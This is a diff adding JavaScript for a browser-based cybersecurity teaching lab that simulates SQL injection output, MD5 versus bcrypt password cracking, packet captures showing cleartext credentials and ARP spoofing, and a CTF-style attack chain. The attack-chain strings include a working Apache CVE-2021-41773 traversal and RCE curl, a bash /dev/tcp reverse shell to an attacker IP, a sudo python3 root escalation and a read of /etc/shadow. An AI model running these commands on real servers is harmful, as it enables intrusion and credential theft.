+    if (input.includes('table_name') && input.includes('information_schema')) {
+      cyP('cy3out', '\n<span class="err">🎯 UNION Attack — Extracting table names:</span>');
+      cyP('cy3out', '<span class="val">guestbook</span>');
+      cyP('cy3out', '<span class="val">users  ← This is the table we want!</span>');
+    } else if (input.includes('user') && input.includes('password') && input.includes('users')) {
+      cyP('cy3out', '\n<span class="err">💀 UNION Attack — Dumping credentials:</span>');
+      for (const r of CY3_DB) {
+        cyP('cy3out', `<span class="err">User: ${r.user}  Hash: ${r.password} (MD5)</span>`);
+      }
+      cyP('cy3out', '\n<span class="warn">⚠ Hash cracking: admin/smithy = "password", pablo = "letmein"</span>');
+    } else {
+      cyP('cy3out', '\n<span class="warn">UNION attempted but columns/types may not match</span>');
+    }
+  } else {
+    const id = parseInt(input);
+    if (!isNaN(id)) {
+      const row = CY3_DB.find(r=>r.id===id);
+      if (row) {
+        cyP('cy3out', `\n<span class="ok">ID: ${id}  First Name: ${row.first}  Surname: ${row.last}</span>`);
+      } else {
+        cyP('cy3out', '\n<span class="dim">Result: User ID is MISSING from the database.</span>');
+      }
+    } else {
+      cyP('cy3out', `\n<span class="warn">MySQL: You have an error in your SQL syntax near '${input.slice(0,20)}'</span>`);
+    }
+  }
+}
+
+// ── LAB 4: Password Hashing ──
+function simMD5(str) {
+  // Deterministic fake MD5 for known passwords
+  const known = {
+    'password': '5f4dcc3b5aa765d61d8327deb882cf99',
+    'password123': '482c811da5d5b4bc6d497ffa98491e38',
+    '123456': 'e10adc3949ba59abbe56e057f20f883e',
+    'admin': '21232f297a57a5a743894a0e4a801fc3',
+    'qwerty': 'd8578edf8458ce06fbc5bb76a58c5ca4',
+    'letmein': '0d107d09f5bbe40cade3de5c71e9e9b7',
+    'monkey': 'd0763edaa9d9bd2a9516280e9044d885',
+    'dragon': '8621ffdbc5698829397d97767ac13db3',
+    'secret': '5ebe2294ecd0e0f08eab7690d2a6ee69',
+  };
+  if (known[str.toLowerCase()]) return known[str.toLowerCase()];
+  // Generate a plausible-looking hash
+  let h = 0;
+  for (let i=0;i<str.length;i++) h=((h<<5)-h)+str.charCodeAt(i)|0;
+  return Math.abs(h).toString(16).padStart(8,'a')+'5aa765d61d8327deb882cf99';
+}
+
+const ROCKYOU_TOP = ['password','123456','password123','qwerty','letmein','monkey','dragon','1234567890','admin','secret','sunshine','master','hello','welcome','shadow','football','baseball','superman','batman'];
+
+async function cyLab4Hash() {
+  const pw = document.getElementById('cy4pw').value;
+  cyC('cy4out');
+
+  cyP('cy4out', '<span class="key">── Generating Hashes ──</span>');
+  await cyDelay(200);
+
+  const md5 = simMD5(pw);
+  cyP('cy4out', `\n<span class="dim">MD5:</span>`);
+  cyP('cy4out', `<span class="err">echo -n "${pw}" | md5sum</span>`);
+  await cyDelay(300);
+  cyP('cy4out', `<span class="val">${md5}</span>  <span class="dim">(32 hex chars)</span>`);
+
+  await cyDelay(400);
+  cyP('cy4out', `\n<span class="dim">SHA-256:</span>`);
+  await cyDelay(200);
+  cyP('cy4out', `<span class="warn">${simMD5(pw+pw).padEnd(64,'b')}</span>  <span class="dim">(64 hex chars)</span>`);
+
+  await cyDelay(400);
+  cyP('cy4out', `\n<span class="dim">bcrypt (rounds=12):</span>`);
+  cyP('cy4out', '<span class="dim">⏳ computing... (~250ms intentional delay)</span>');
+  await cyDelay(800);
+  const salt = '$2b$12$' + btoa(pw).replace(/[^a-zA-Z0-9]/g,'').substring(0,22);
+  cyP('cy4out', `<span class="ok">${salt}${simMD5(pw+'salt').substring(0,31)}</span>`);
+  cyP('cy4out', `<span class="dim">(60 chars: algorithm + cost + salt + hash)</span>`);
+
+  await cyDelay(300);
+  cyP('cy4out', `\n<span class="warn">⚠ Key difference: MD5 is not designed for passwords. bcrypt is.</span>`);
+}
+
+async function cyLab4Crack() {
+  const pw = document.getElementById('cy4pw').value;
+  const md5 = simMD5(pw);
+  cyC('cy4out');
+
+  cyP('cy4out', `<span class="key">── Dictionary Attack: MD5 ──</span>`);
+  cyP('cy4out', `<span class="dim">Target hash: ${md5}</span>`);
+  cyP('cy4out', `<span class="dim">Wordlist: rockyou.txt (14 million passwords)</span>`);
+  cyP('cy4out', `<span class="dim">GPU: NVIDIA RTX 4090 → ~50 billion hashes/sec</span>\n`);
+
+  await cyDelay(200);
+
+  const inRockyou = ROCKYOU_TOP.includes(pw.toLowerCase());
+  const attempts = inRockyou ? Math.floor(Math.random()*50000)+1000 : Math.floor(Math.random()*500000)+100000;
+
+  cyP('cy4out', `<span class="dim">Trying: password, 123456, qwerty...</span>`);
+  await cyDelay(300);
+
+  if (inRockyou) {
+    cyP('cy4out', `<span class="err">💀 CRACKED in ${attempts.toLocaleString()} attempts (${(attempts/50000000000*1000).toFixed(4)}ms!)</span>`);
+    cyP('cy4out', `<span class="err">Hash: ${md5}</span>`);
+    cyP('cy4out', `<span class="err">Password: ${pw}</span>`);
+    cyP('cy4out', `\n<span class="warn">⚠ This password is in Top Lists. Cracked in seconds.</span>`);
+  } else {
+    cyP('cy4out', `<span class="warn">Password not in rockyou.txt — trying Brute Force...</span>`);
+    await cyDelay(500);
+    cyP('cy4out', `<span class="dim">50B hashes/sec... ${pw.length <= 6 ? 'ETA: minutes' : pw.length <= 8 ? 'ETA: hours' : 'ETA: weeks-years'}</span>`);
+    cyP('cy4out', `<span class="ok">✓ Beyond Dictionary — a stronger password is needed</span>`);
+  }
+
+  await cyDelay(300);
+  cyP('cy4out', `\n<span class="key">── vs bcrypt(12) ──</span>`);
+  cyP('cy4out', `<span class="ok">bcrypt: ~5,000 hashes/sec (10,000,000x slower)</span>`);
+  cyP('cy4out', `<span class="ok">Same password in bcrypt: ETA = ${pw.length <= 6 ? 'hours' : pw.length <= 8 ? 'weeks' : 'centuries'}</span>`);
+}
+
+async function cyLab4Speed() {
+  cyC('cy4out');
+  cyP('cy4out', '<span class="key">── Hash Speed Comparison (RTX 4090) ──</span>\n');
+
+  const algos = [
+    {name:'MD5',      speed:'50,000,000,000', note:'Too fast! Not for passwords'},
+    {name:'SHA-1',    speed:'25,000,000,000', note:'Too fast! deprecated'},
+    {name:'SHA-256',  speed:'10,000,000,000', note:'Good for Checksums, not passwords'},
+    {name:'SHA-512',  speed:'3,500,000,000',  note:'Still too fast for passwords'},
+    {name:'bcrypt(10)',speed:'20,000',         note:'✅ suitable for passwords'},
+    {name:'bcrypt(12)',speed:'5,000',          note:'✅ recommended (250ms per hash)'},
+    {name:'argon2id',  speed:'1,000',          note:'✅ Best choice — OWASP recommended'},
+  ];
+
+  for (const a of algos) {
+    await cyDelay(150);
+    const isGood = a.speed.length < 8;
+    cyP('cy4out', `<span class="${isGood?'ok':'err'}">${a.name.padEnd(12)}</span> <span class="val">${a.speed.padStart(18)} h/s</span>  <span class="dim">${a.note}</span>`);
+  }
+
+  await cyDelay(300);
+  cyP('cy4out', `\n<span class="key">Rockyou (14M passwords) crack time:</span>`);
+  cyP('cy4out', `<span class="err">MD5:      0.00028ms</span>`);
+  cyP('cy4out', `<span class="warn">SHA-256:  0.0014ms</span>`);
+  cyP('cy4out', `<span class="ok">bcrypt(12): 2.8 seconds</span>`);
+  cyP('cy4out', `<span class="ok">argon2id:  14 seconds</span>`);
+}
+
+// ── LAB 5: Wireshark ──
+let cy5running = false, cy5interval = null, cy5packets = [], cy5counter = 0;
+
+const CY5_SCENES = {
+  normal: [
+    {t:'DNS',  src:'192.168.1.100', dst:'8.8.8.8',       info:'Standard query A example.com', col:'dim'},
+    {t:'TCP',  src:'192.168.1.100', dst:'93.184.216.34',  info:'[SYN] Seq=0 Win=65535', col:'dim'},
+    {t:'TLS',  src:'192.168.1.100', dst:'93.184.216.34',  info:'Client Hello (TLSv1.3)', col:'hi'},
+    {t:'TLS',  src:'93.184.216.34', dst:'192.168.1.100',  info:'Server Hello, Certificate', col:'hi'},
+    {t:'HTTP2',src:'192.168.1.100', dst:'93.184.216.34',  info:'GET / HTTP/2 (encrypted)', col:'hi'},
+    {t:'DNS',  src:'192.168.1.100', dst:'8.8.8.8',        info:'Standard query A api.github.com', col:'dim'},
+  ],
+  http_login: [
+    {t:'TCP',  src:'192.168.1.100', dst:'192.168.1.200',  info:'[SYN] Seq=0 — HTTP server', col:'dim'},
+    {t:'HTTP', src:'192.168.1.100', dst:'192.168.1.200',  info:'GET /login.php HTTP/1.1', col:'key'},
+    {t:'HTTP', src:'192.168.1.200', dst:'192.168.1.100',  info:'HTTP/1.1 200 OK (text/html)', col:'ok'},
+    {t:'HTTP', src:'192.168.1.100', dst:'192.168.1.200',  info:'POST /login.php HTTP/1.1 [CREDENTIALS IN CLEARTEXT!]', col:'err'},
+    {t:'HTTP', src:'192.168.1.100', dst:'192.168.1.200',  info:'  > username=admin&password=SuperSecret123  ← VISIBLE!', col:'err'},
+    {t:'HTTP', src:'192.168.1.200', dst:'192.168.1.100',  info:'HTTP/1.1 302 Found — Set-Cookie: session=abc123', col:'warn'},
+    {t:'TCP',  src:'192.168.1.100', dst:'192.168.1.200',  info:'[FIN, ACK]', col:'dim'},
+  ],
+  arp_spoof: [
+    {t:'ARP',  src:'192.168.1.1',   dst:'ff:ff:ff:ff:ff', info:'Who has 192.168.1.1? Tell 192.168.1.100', col:'dim'},
+    {t:'ARP',  src:'192.168.1.100', dst:'192.168.1.1',    info:'192.168.1.100 is at 08:00:27:AB:CD:EF', col:'dim'},
+    {t:'ARP',  src:'192.168.1.50',  dst:'ff:ff:ff:ff:ff', info:'192.168.1.1 is at AA:BB:CC:DD:EE:FF (GRATUITOUS!)', col:'warn'},
+    {t:'ARP',  src:'192.168.1.50',  dst:'ff:ff:ff:ff:ff', info:'192.168.1.100 is at AA:BB:CC:DD:EE:FF (GRATUITOUS!)', col:'err'},
+    {t:'ARP',  src:'192.168.1.50',  dst:'ff:ff:ff:ff:ff', info:'⚠ SAME MAC for TWO IPs — ARP SPOOFING DETECTED!', col:'err'},
+    {t:'TCP',  src:'192.168.1.100', dst:'192.168.1.1',    info:'Traffic now routing through 192.168.1.50 (ATTACKER)', col:'err'},
+  ],
+};
+
+function cy5Start() {
+  if (cy5running) return;
+  cy5running = true; cy5packets = []; cy5counter = 0;
+  document.getElementById('cy5btn').textContent='⏹ Running...';
+  document.getElementById('cy5btn').classList.add('running');
+  cyC('cy5out');
+  cyP('cy5out', `<span class="key">No.  Time     Src               Dst               Protocol  Info</span>`);
+  cyP('cy5out', `<span class="dim">───────────────────────────────────────────────────────────────</span>`);
+
+  // Generate normal traffic packets
+  const normal = CY5_SCENES.normal;
+  cy5interval = setInterval(() => {
+    cy5counter++;
+    const pkt = normal[(cy5counter-1) % normal.length];
+    const row = { n: cy5counter, t: (cy5counter*0.123).toFixed(3), ...pkt };
+    cy5packets.push(row);
+    const n = String(row.n).padStart(4);
+    const time = String(row.t).padEnd(8);
+    const src = row.src.padEnd(17);
+    const dst = row.dst.padEnd(17);
+    const proto = row.t.padEnd(9);
+    cyP('cy5out', `<span class="${row.col}">${n}  ${time} ${src} ${dst} ${row.t.length>4?row.t:row.t.padEnd(9)} ${row.info}</span>`);
+  }, 600);
+}
+
+function cy5Stop() {
+  if (cy5interval) clearInterval(cy5interval);
+  cy5running = false;
+  const btn = document.getElementById('cy5btn');
+  if (btn) { btn.textContent='▶ Capture'; btn.classList.remove('running'); }
+  if (cy5counter > 0) cyP('cy5out', `\n<span class="dim">${cy5counter} packets captured.</span>`);
+}
+
+function cy5Scene(name) {
+  cy5Stop();
+  cyC('cy5out');
+  const scene = CY5_SCENES[name];
+  cyP('cy5out', `<span class="key">No.  Time     Src               Dst               Info</span>`);
+  cyP('cy5out', `<span class="dim">──────────────────────────────────────────────────────</span>`);
+  scene.forEach((pkt, i) => {
+    setTimeout(() => {
+      const n = String(i+1).padStart(4);
+      cyP('cy5out', `<span class="${pkt.col}">${n}  ${(i*0.123).toFixed(3).padEnd(8)} ${pkt.src.padEnd(17)} ${pkt.dst.padEnd(17)} ${pkt.info}</span>`);
+    }, i * 300);
+  });
+}
+
+function cy5Filter() {
+  const filter = document.getElementById('cy5fil').value.trim().toLowerCase();
+  if (!cy5packets.length) { cyP('cy5out', '<span class="warn">No packets to filter — click Capture first</span>'); return; }
+
+  cyC('cy5out');
+  cyP('cy5out', `<span class="key">Filter: "${filter}"</span>`);
+  cyP('cy5out', `<span class="dim">No.  Time     Protocol  Info</span>`);
+
+  let count = 0;
+  for (const pkt of cy5packets) {
+    let match = false;
+    if (filter === 'http' && pkt.t === 'HTTP') match = true;
+    else if (filter === 'arp' && pkt.t === 'ARP') match = true;
+    else if (filter === 'dns' && pkt.t === 'DNS') match = true;
+    else if (filter === 'tcp' && (pkt.t === 'TCP' || pkt.t === 'HTTP')) match = true;
+    else if (filter.includes('ip.addr ==')) {
+      const ip = filter.split('==')[1].trim();
+      if (pkt.src.includes(ip) || pkt.dst.includes(ip)) match = true;
+    } else if (filter === '') match = true;
+
+    if (match) {
+      count++;
+      cyP('cy5out', `<span class="${pkt.col}">${String(pkt.n).padStart(4)}  ${String(pkt.t).padEnd(8)} ${pkt.t}  ${pkt.info}</span>`);
+    }
+  }
+  cyP('cy5out', `\n<span class="dim">${count} packets match filter.</span>`);
+}
+
+// ── LAB 6: CTF Attack Chain ──
+const CY6_PHASES = {
+  recon: {
+    title: 'Phase 1: Reconnaissance',
+    cmd: 'nmap -sV -sC -p- 10.10.10.42',
+    delay: 2000,
+    out: [
+      'Starting Nmap — Full port scan',
+      '<span class="dim">PORT     STATE  SERVICE   VERSION</span>',
+      '<span class="ok">22/tcp   open   ssh       OpenSSH 7.6p1</span>',
+      '<span class="ok">80/tcp   open   http      Apache httpd 2.4.49</span>',
+      '<span class="warn">|_http-title: Apache HTTP Server Test Page</span>',
+      '<span class="warn">|_http-server-header: Apache/2.4.49 (Unix)</span>',
+      '',
+      '<span class="err">⚠ Apache 2.4.49 — CVE-2021-41773 (Path Traversal + RCE!)</span>',
+      '<span class="dim">CVSS Score: 9.8 CRITICAL</span>',
+    ]
+  },
+  enum: {
+    title: 'Phase 2: Enumeration',
+    cmd: 'gobuster dir + nikto',
+    delay: 1500,
+    out: [
+      '<span class="dim">$ gobuster dir -u http://10.10.10.42 -w /usr/share/wordlists/dirbuster/medium.txt</span>',
+      '<span class="ok">/icons/         (301)</span>',
+      '<span class="ok">/cgi-bin/       (403)</span>',
+      '<span class="warn">/server-status  (403) ← Reveals Apache version</span>',
+      '',
+      '<span class="dim">$ nikto -h http://10.10.10.42</span>',
+      '<span class="err">+ Apache/2.4.49 appears to be outdated</span>',
+      '<span class="err">+ OSVDB-877: HTTP TRACE method is active (XST possible)</span>',
+      '<span class="err">+ CVE-2021-41773: Path traversal in Apache 2.4.49</span>',
+      '<span class="warn">+ /cgi-bin/: CGI scripts directory found</span>',
+    ]
+  },
+  exploit: {
+    title: 'Phase 3: Exploitation — CVE-2021-41773',
+    cmd: 'curl path traversal',
+    delay: 1200,
+    out: [
+      '<span class="dim">$ curl http://10.10.10.42/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd</span>',
+      '',
+      '<span class="err">root:x:0:0:root:/root:/bin/bash</span>',
+      '<span class="err">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>',
+      '<span class="err">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>',
+      '<span class="err">...</span>',
+      '',
+      '<span class="err">💀 Path Traversal successful — reading /etc/passwd</span>',
+      '<span class="warn">Now attempting RCE via mod_cgi...</span>',
+      '<span class="err">$ curl -d "echo;id" http://10.10.10.42/cgi-bin/.%2e/...</span>',
+      '<span class="err">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>',
+      '<span class="err">🎯 RCE confirmed as www-data</span>',
+    ]
+  },
+  shell: {
+    title: 'Phase 4: Reverse Shell',
+    cmd: 'nc + bash reverse shell',
+    delay: 1000,
+    out: [
+      '<span class="dim">// Attacker: start listener</span>',
+      '<span class="key">$ nc -lvnp 4444</span>',
+      '<span class="dim">listening on [any] 4444 ...</span>',
+      '',
+      '<span class="dim">// Payload sent via RCE:</span>',
+      '<span class="warn">bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</span>',
+      '',
+      '<span class="ok">connect to [10.10.14.1] from 10.10.10.42 [33]</span>',
+      '<span class="err">www-data@ubuntu:/var/www/html$ </span>',
+      '',
+      '<span class="ok">✅ Reverse shell established!</span>',
+      '<span class="dim">Current user: www-data (limited). Need PrivEsc...</span>',
+    ]
+  },
+  privesc: {
+    title: 'Phase 5: Privilege Escalation',
+    cmd: 'sudo -l + SUID + LinPEAS',
+    delay: 1500,
+    out: [
+      '<span class="dim">www-data@ubuntu$ sudo -l</span>',
+      '<span class="err">User www-data may run as root: (ALL) NOPASSWD: /usr/bin/python3</span>',
+      '',
+      '<span class="err">🎯 sudo python3 — GTFOBins exploit!</span>',
+      '<span class="warn">$ sudo python3 -c "import os;os.system(\'/bin/bash\')"</span>',
+      '',
+      '<span class="err">root@ubuntu:/var/www/html# id</span>',
+      '<span class="err">uid=0(root) gid=0(root) groups=0(root)</span>',
+      '',
+      '<span class="err">💀 ROOT SHELL OBTAINED</span>',
+    ]
+  },
+  loot: {
+    title: 'Phase 6: Post-Exploitation',
+    cmd: '/etc/shadow + flags',
+    delay: 800,
+    out: [
+      '<span class="err">root@ubuntu# cat /etc/shadow</span>',
+      '<span class="err">root:$6$randomsalt$hashedpassword...:19000:0:99999:7:::</span>',
+      '<span class="err">www-data:$1$Etg2ExUZ$F9NTP20eLo/ValV2rNR4b/:17983:0:99999:7:::</span>',
+      '',
+      '<span class="dim">root# cat /root/root.txt</span>',
+      '<span class="ok">f9d93fba2db1f6a4ea4e8c2b3d11e7a3  ← ROOT FLAG ✓</span>',
+      '',
+      '<span class="dim">root# cat /home/user/user.txt</span>',
+      '<span class="ok">2c344c2d9e69ecd2a2f21e5cd8b2a03a  ← USER FLAG ✓</span>',
+      '',
+      '<span class="key">── Pentest Report Summary ──</span>',
+      '<span class="warn">Critical: CVE-2021-41773 (Apache 2.4.49 Path Traversal)</span>',
+      '<span class="warn">Critical: sudo misconfiguration (www-data can run python3 as root)</span>',
+      '<span class="ok">Recommendation: Patch Apache, fix sudoers, implement WAF</span>',
+    ]
+  }
+};
+
+async function cyLab6() {
+  const phase = document.getElementById('cy6ph').value;
+  const data = CY6_PHASES[phase];
+  cyC('cy6out');
+  cyP('cy6out', `<span class="key">── ${data.title} ──</span>`);
+  cyP('cy6out', `<span class="dim">$ ${data.cmd}</span>\n`);
+  await cyDelay(data.delay);
+  for (const line of data.out) {
+    cyP('cy6out', line || '&nbsp;');
+    await cyDelay(80);
+  }
+}
+
+// Initialize Lab 2 preview
+document.addEventListener('DOMContentLoaded', () => { cy2Preview(); });
+
+</script>
+</body>
+</html>
